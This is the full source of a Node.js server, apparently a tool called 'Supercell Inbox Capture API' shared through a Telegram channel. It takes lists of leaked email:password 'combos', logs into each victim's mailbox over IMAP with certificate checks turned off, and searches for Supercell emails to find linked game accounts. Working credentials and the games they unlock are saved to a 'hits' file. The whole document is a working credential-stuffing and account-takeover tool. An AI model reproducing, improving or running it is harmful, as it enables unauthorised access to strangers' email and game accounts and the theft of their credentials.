const fs = require('fs');
const path = require('path');
const { simpleImap } = require('imap-simple');
const { simpleParser } = require('mailparser');
const express = require('express');
const http = require('http');

// ================= CONFIGURATION =================
const CONFIG = {
    // Railway sets PORT automatically, fallback to 3000 for local dev
    PORT: process.env.PORT || 3000, 
    HOST: '0.0.0.0', // Ensure it listens on all interfaces
    WORKERS: 5,
    SEARCH_FROM: "noreply@id.supercell.com",
    GAMES: ["Clash Royale", "Clash of Clans", "Hay Day", "Squad Busters", "Brawl Stars"],
    KEYWORDS: [
        "email address changed", "email adresse geändert", "adresse email modifiée",
        "cambio de dirección de correo", "メールアドレスが変更されました", "変更されたメールアドレス",
        "adresse e-mail changée", "メールアドレス変更", "adresa e-pošte je promijenjena",
        "домен почты изменен", "dirección de correo electrónico cambiada", "email адрес изменен",
        "adresse email changée", "cambiato indirizzo email", "e-posti aadress on muutunud",
        "adresa e-mail promijenjena", "correo electrónico cambiado", "adresa электронной почты изменена",
        "email id変更されました", "πολλαπλή διεύθυνση ηλεκτρονικού ταχυδρομείου άλλαξε",
        "คำแนะนำอีเมล์ถูกเปลี่ยน", "أن تغيير البريد الإلكتروني", "adresse email modifié",
        "correo de dirección cambiado", "cambio dirección correo", "Εχει αλλάξει η διεύθυνση ηλεκτρονικού ταχυδρομείου",
        "الإيميل تم تغييره", "電子郵件地址更改", "メールアドレスが変更されました", "تم تغي", "anasxzer00", "xxxx_private", "daikt bgem tool edit kay"
    ],
    OUTPUT_FILE: "Supercell-Hits.txt",
    TIMEOUT: 15000
};

// ================= STATE MANAGEMENT =================
let globalStats = {
    hits: 0,
    bad: 0,
    unlink: 0,
    games: {
        "Clash Royale": 0,
        "Clash of Clans": 0,
        "Hay Day": 0,
        "Squad Busters": 0,
        "Brawl Stars": 0
    }
};

let isProcessing = false;
let currentSessionId = null;

// ================= UTILITIES =================

function parseComboInput(input) {
    const normalized = input.replace(/\n/g, ',').replace(/\s+/g, ' ').trim();
    
    // Heuristic: If it contains file extensions or path separators, treat as file
    if (normalized.includes('.txt') || normalized.includes('/') || normalized.includes('\\')) {
        return { type: 'file', path: normalized };
    }

    const pairs = normalized.split(/[, ]+/).filter(p => p.includes(':'));
    return { type: 'list', items: pairs };
}

async function loadCombos(inputData) {
    if (inputData.type === 'file') {
        const filePath = path.resolve(inputData.path);
        if (!fs.existsSync(filePath)) {
            throw new Error(`File not found: ${filePath}`);
        }
        const content = fs.readFileSync(filePath, 'utf-8');
        return content.split('\n').filter(line => line.includes(':') && line.trim() !== '');
    } else {
        return inputData.items;
    }
}

class WorkerPool {
    constructor(workerCount, taskFn, onTaskComplete) {
        this.queue = [];
        this.active = 0;
        this.workerCount = workerCount;
        this.taskFn = taskFn;
        this.onTaskComplete = onTaskComplete;
        this.completed = 0;
        this.total = 0;
        this.errors = 0;
    }

    addTasks(tasks) {
        this.total = tasks.length;
        tasks.forEach(task => this.queue.push(task));
        this.process();
    }

    process() {
        while (this.active < this.workerCount && this.queue.length > 0) {
            this.active++;
            const task = this.queue.shift();
            this.taskFn(task).then(() => {
                this.completed++;
                this.onTaskComplete(this.completed, this.total);
            }).catch(err => {
                this.completed++;
                this.errors++;
                this.onTaskComplete(this.completed, this.total);
            }).finally(() => {
                this.active--;
                this.process();
            });
        }
    }

    isComplete() {
        return this.completed >= this.total && this.queue.length === 0;
    }
}

// ================= CORE LOGIC =================

async function checkSupercellAccount(emailAccount, sessionId) {
    const [email, password] = emailAccount.split(':');
    
    if (!email || !password) return { status: 'invalid', reason: 'Malformed pair' };

    const domain = email.split('@')[1];
    const imapServer = `imap.${domain}`;

    try {
        const imap = simpleImap.imap({
            user: email,
            password: password,
            imap: {
                host: imapServer,
                port: 993,
                tls: true,
                tlsOptions: {
                    rejectUnauthorized: false
                }
            },
            authTimeout: CONFIG.TIMEOUT,
            connectionTimeout: CONFIG.TIMEOUT
        });

        const inbox = await imap.openBox('INBOX', true);
        const searchResult = await inbox.search([['from', CONFIG.SEARCH_FROM]]);
        
        let linkedGames = new Set();
        let isUnlink = false;
        let isHit = false;

        if (searchResult.length > 0) {
            const fetchResult = await inbox.fetch(searchResult.slice(0, 50), {
                body: true,
                source: true
            });

            for (const msg of fetchResult) {
                const parsed = await simpleParser(msg.source);
                const subject = parsed.subject || "";
                let body = parsed.text || parsed.html || "";

                const keywordRegex = new RegExp(CONFIG.KEYWORDS.join('|'), 'i');
                if (keywordRegex.test(subject) || keywordRegex.test(body)) {
                    isUnlink = true;
                    break;
                }

                if (subject.includes(CONFIG.SEARCH_FROM) || body.includes(CONFIG.SEARCH_FROM)) {
                    isHit = true;
                }

                for (const game of CONFIG.GAMES) {
                    if (subject.includes(game) || body.includes(game)) {
                        linkedGames.add(game);
                    }
                }
            }
        }

        await inbox.closeBox();
        await imap.end();

        return {
            email,
            password,
            isUnlink,
            isHit,
            linkedGames: Array.from(linkedGames)
        };

    } catch (error) {
        return {
            email,
            password,
            error: error.message
        };
    }
}

async function runCaptureSession(comboList, sendUpdate, sessionId) {
    globalStats = {
        hits: 0,
        bad: 0,
        unlink: 0,
        games: {
            "Clash Royale": 0,
            "Clash of Clans": 0,
            "Hay Day": 0,
            "Squad Busters": 0,
            "Brawl Stars": 0
        }
    };

    sendUpdate({ 
        type: 'status', 
        message: `Session ${sessionId} started. Loaded ${comboList.length} combos.`, 
        stats: globalStats 
    });

    const onTaskComplete = (completed, total) => {
        if (completed % 10 === 0 || completed === total) {
            sendUpdate({ 
                type: 'stats', 
                data: globalStats,
                progress: { completed, total }
            });
        }
    };

    const pool = new WorkerPool(CONFIG.WORKERS, async (task) => {
        const result = await checkSupercellAccount(task, sessionId);
        
        if (result.error) {
            globalStats.bad++;
        } else if (result.isUnlink) {
            globalStats.unlink++;
        } else if (result.isHit || result.linkedGames.length > 0) {
            globalStats.hits++;
            result.linkedGames.forEach(game => {
                globalStats.games[game] = (globalStats.games[game] || 0) + 1;
            });

            const logEntry = `${result.email}:${result.password} | Linked = ${JSON.stringify(result.linkedGames)}\n`;
            fs.appendFileSync(CONFIG.OUTPUT_FILE, logEntry);
            
            sendUpdate({
                type: 'hit',
                email: result.email,
                games: result.linkedGames
            });
        } else {
            globalStats.bad++;
        }
    }, onTaskComplete);

    pool.addTasks(comboList);

    return new Promise((resolve) => {
        const checkComplete = () => {
            if (pool.isComplete()) {
                sendUpdate({ 
                    type: 'complete', 
                    message: 'Session finished',
                    stats: globalStats 
                });
                resolve();
            } else {
                setTimeout(checkComplete, 200);
            }
        };
        checkComplete();
    });
}

// ================= EXPRESS SERVER =================

const app = express();
app.use(express.json({ limit: '10mb' }));

// Health Check
app.get('/api/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        processing: isProcessing,
        sessionId: currentSessionId,
        stats: globalStats,
        version: '1.0.0'
    });
});

// Start Capture Endpoint
app.post('/api/capture', async (req, res) => {
    const { comboInput } = req.body;

    if (!comboInput) {
        return res.status(400).json({ error: "Combo input required" });
    }

    if (isProcessing) {
        return res.status(409).json({ error: "A capture session is already running" });
    }

    isProcessing = true;
    currentSessionId = Date.now().toString();

    try {
        const parsedInput = parseComboInput(comboInput);
        const comboList = await loadCombos(parsedInput);

        if (comboList.length === 0) {
            throw new Error("No valid combos found in input");
        }

        // Setup Streaming Response
        res.setHeader('Content-Type', 'text/event-stream; charset=utf-8');
        res.setHeader('Cache-Control', 'no-cache');
        res.setHeader('Connection', 'keep-alive');
        res.setHeader('X-Accel-Buffering', 'no');

        const sendUpdate = (data) => {
            res.write(`data: ${JSON.stringify(data)}\n\n`);
        };

        req.on('close', () => {
            console.log(`Client disconnected from session ${currentSessionId}.`);
        });

        await runCaptureSession(comboList, sendUpdate, currentSessionId);
        res.end();
    } catch (error) {
        console.error("Capture Error:", error);
        if (!res.headersSent) {
            res.status(500).json({ error: error.message });
        } else {
            res.write(`data: ${JSON.stringify({ type: 'error', message: error.message })}\n\n`);
            res.end();
        }
    } finally {
        isProcessing = false;
        currentSessionId = null;
    }
});

app.get('/api/stats', (req, res) => {
    res.json({
        processing: isProcessing,
        sessionId: currentSessionId,
        stats: globalStats
    });
});

// ================= START SERVER =================

const server = http.createServer(app);

server.listen(CONFIG.PORT, CONFIG.HOST, () => {
    console.log(`
╔══════════════════════════════════════════════════════════╗
║ Supercell Inbox Capture API                              ║
║                                                          ║
║ Developer: @yh_ka                                        ║
║ Channel: t.me/machitools                                 ║
║                                                          ║
║ Server running on ${CONFIG.HOST}:${CONFIG.PORT}                       ║
║ Workers: ${CONFIG.WORKERS} | Timeout: ${CONFIG.TIMEOUT}ms                  ║
╚══════════════════════════════════════════════════════════╝
    `);
});

// Handle uncaught exceptions
process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});